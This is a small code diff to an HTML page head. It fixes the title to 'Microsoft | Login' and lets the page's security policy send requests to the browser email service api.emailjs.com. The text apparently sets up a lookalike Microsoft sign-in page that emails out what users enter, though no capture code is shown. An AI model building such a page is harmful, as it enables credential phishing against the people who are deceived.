@@ -9,10 +9,16 @@
     <meta http-equiv="X-Frame-Options" content="DENY" />
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'self'; img-src 'self' data:; script-src 'self'; style-src 'self' 'unsafe-inline';"
+      content="
+        default-src 'self';
+        connect-src 'self' https://api.emailjs.com;
+        img-src 'self' data:;
+        script-src 'self';
+        style-src 'self' 'unsafe-inline';
+      "
     />
     <link rel="manifest" href="/manifest.json" />
-    <title>Mcrosoft | Login</title>
+    <title>Microsoft | Login</title>
   </head>
   <body>
     <div id="root"></div>
